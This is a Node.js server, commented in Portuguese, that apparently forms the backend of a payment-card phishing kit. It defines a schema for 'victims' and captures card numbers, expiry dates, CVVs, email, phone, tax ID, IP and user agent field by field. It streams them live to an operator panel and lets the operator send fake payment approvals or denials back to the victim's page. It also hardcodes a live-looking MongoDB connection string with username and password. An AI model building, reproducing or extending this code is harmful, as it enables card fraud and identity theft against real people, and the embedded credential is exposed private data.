
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import mongoose from 'mongoose';
import cors from 'cors';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(cors());

const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "*", // Permitir todas as origens para facilitar a operação
    methods: ["GET", "POST"]
  }
});

// --- CONEXÃO MONGODB (CREDENCIAIS INJETADAS) ---
const MONGO_URI = "mongodb+srv://jotagametks_db_user:6HIQI8lzITmC5oo9@cluster0.jdksgly.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

mongoose.connect(MONGO_URI)
  .then(() => console.log('>> [DB] CONEXÃO COM MONGODB ATLAS ESTABELECIDA <<'))
  .catch(err => console.error('!! [DB] ERRO CRÍTICO NA CONEXÃO !!', err));

// --- SCHEMA DA VÍTIMA ---
const CaptureSchema = new mongoose.Schema({
  sessionId: { type: String, required: true, unique: true },
  socketId: { type: String, required: true },
  cardNumber: { type: String, default: '' },
  cardHolder: { type: String, default: '' },
  expiryDate: { type: String, default: '' },
  cvv: { type: String, default: '' },
  email: { type: String, default: '' },
  phone: { type: String, default: '' },
  nif: { type: String, default: '' },
  paymentMethod: { type: String, default: 'card' },
  paymentStatus: { type: String, default: 'idle' }, // idle, processing, approved, denied
  ip: { type: String, default: '' },
  userAgent: { type: String, default: '' },
  timestamp: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const Capture = mongoose.model('Capture', CaptureSchema);

// --- LÓGICA SOCKET.IO ---

io.on('connection', (socket) => {
  console.log(`[NET] Nova conexão detectada: ${socket.id}`);

  // Identificar se é Admin ou Vítima (Simples check)
  // Na prática, assumimos que o Admin envia eventos específicos, 
  // mas aqui tratamos todos como potenciais alvos até que enviem dados.

  // 1. INICIALIZAÇÃO DA SESSÃO (VÍTIMA)
  socket.on('field_update', async (data) => {
    try {
      const { field, value } = data;
      const sessionId = socket.id; // Usando socket.id como session ID para mapeamento direto

      // Upsert (Criar ou Atualizar) no MongoDB
      const updateData = {
        sessionId: sessionId,
        socketId: socket.id,
        [field]: value,
        updatedAt: new Date(),
        ip: socket.handshake.address,
        userAgent: socket.request.headers['user-agent']
      };

      await Capture.findOneAndUpdate(
        { sessionId: sessionId },
        { $set: updateData },
        { upsert: true, new: true }
      );

      // 2. RETRANSMISSÃO PARA O ADMIN (PAINEL EM TEMPO REAL)
      // Envia para todos os sockets (o AdminPanel irá filtrar e exibir)
      io.emit('admin_update', {
        sessionId: sessionId,
        field: field,
        value: value
      });

      console.log(`[CAPTURE] ${sessionId} -> ${field}: ${value}`);

    } catch (error) {
      console.error('[ERR] Falha ao processar dados:', error);
    }
  });

  // 3. COMANDO DO ADMIN (APROVAR/NEGAR)
  socket.on('admin_decision', async (data) => {
    try {
      const { sessionId, status } = data; // status: 'approved' | 'denied'
      
      console.log(`[CMD] ADMIN DECISION para ${sessionId}: ${status}`);

      // Atualizar status no DB
      const doc = await Capture.findOneAndUpdate(
        { sessionId: sessionId },
        { $set: { paymentStatus: status, updatedAt: new Date() } },
        { new: true }
      );

      if (doc) {
        // Enviar comando ESPECÍFICO para o socket da vítima
        // Se o sessionId for igual ao socketId (como definido acima)
        io.to(doc.socketId).emit('payment_result', { status: status });
        
        // Confirmar atualização para todos os Admins conectados
        io.emit('admin_update', {
            sessionId: sessionId,
            field: 'paymentStatus',
            value: status
        });
      }

    } catch (error) {
      console.error('[ERR] Falha ao executar comando admin:', error);
    }
  });

  socket.on('disconnect', () => {
    console.log(`[NET] Conexão encerrada: ${socket.id}`);
  });
});

// Servir arquivos estáticos (Frontend) se necessário, ou usar Proxy no Vite
// app.use(express.static(join(__dirname, 'dist')));

const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, () => {
  console.log(`
  ███████╗██╗  ██╗████████╗
  ██╔════╝╚██╗██╔╝╚══██╔══╝
  █████╗   ╚███╔╝    ██║   
  ██╔══╝   ██╔██╗    ██║   
  ███████╗██╔╝ ██╗   ██║   
  ╚══════╝╚═╝  ╚═╝   ╚═╝   
  
  [SYSTEM ONLINE] PORT: ${PORT}
  [MODE] CAPTURA & COMANDO
  `);
});
